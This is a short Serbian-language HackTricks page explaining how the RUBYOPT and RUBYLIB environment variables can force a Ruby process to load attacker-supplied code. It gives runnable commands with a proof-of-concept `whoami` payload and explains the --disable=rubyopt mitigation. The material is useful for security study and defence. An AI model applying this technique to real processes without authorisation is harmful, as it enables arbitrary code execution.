# Injekcija u Ruby aplikacije

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby analizira podržane opcije komandne linije iz promenljive okruženja `RUBYOPT` pre pokretanja skripte. Ruby odbija izvršavanje koda putem opcije `-e` u promenljivoj `RUBYOPT`, ali `-I` može dodati direktorijum za pretragu biblioteka, a `-r` može zahtevati biblioteku. Proces koji pokreće Ruby sa promenljivama okruženja pod kontrolom napadača zato može biti primoran da učita Ruby kod pod kontrolom napadača.<sup>[[1]](#references)</sup>

Kreirajte `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Kreirajte bezopasnu Ruby skriptu, kao što je `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Pokrenite ga sa kontrolisanom vrednošću `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Da biste onemogućili ovo ponašanje, prosledite `--disable=rubyopt` (ili `--disable-rubyopt`) **pre** imena skripte:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Opcija navedena nakon `hello.rb` prosleđuje se skripti u `ARGV`; ona ne onemogućava raniju Ruby obradu promenljive `RUBYOPT`.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## RUBYLIB

Umesto dodavanja direktorijuma za učitavanje pomoću `-I` unutar promenljive `RUBYOPT`, zasebna promenljiva okruženja `RUBYLIB` dodaje direktorijume u Ruby-jev `$LOAD_PATH`. U kombinaciji sa `RUBYOPT=-r<module>`, učitava napadačev kod bez potrebe za `-I` u promenljivoj `RUBYOPT`:<sup>[[1]](#references)</sup>
```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```
## References

- [1] [Ruby dokumentacija - Ruby opcije komandne linije](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
